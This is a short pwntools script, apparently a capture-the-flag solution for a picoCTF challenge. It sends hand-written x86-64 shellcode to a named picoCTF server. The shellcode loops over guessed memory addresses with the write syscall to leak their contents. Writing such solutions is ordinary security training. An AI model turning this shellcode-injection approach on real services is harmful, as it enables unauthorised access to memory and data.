from pwn import *

context.binary = ELF('./chall')

payload = asm('''mov r15, 0x555555000000
add r15, 0x202060

jump_here:
add r15, 0x100000
mov rax, 1
mov rdi, 1
mov rsi, r15
mov rdx, 100
syscall

cmp rax, 0
jle jump_here

mov rax, 60
mov rdi, 0
syscall''')

io = remote('mars.picoctf.net', 31021)

io.recvuntil(b'!\n')
io.sendline(payload)

io.interactive()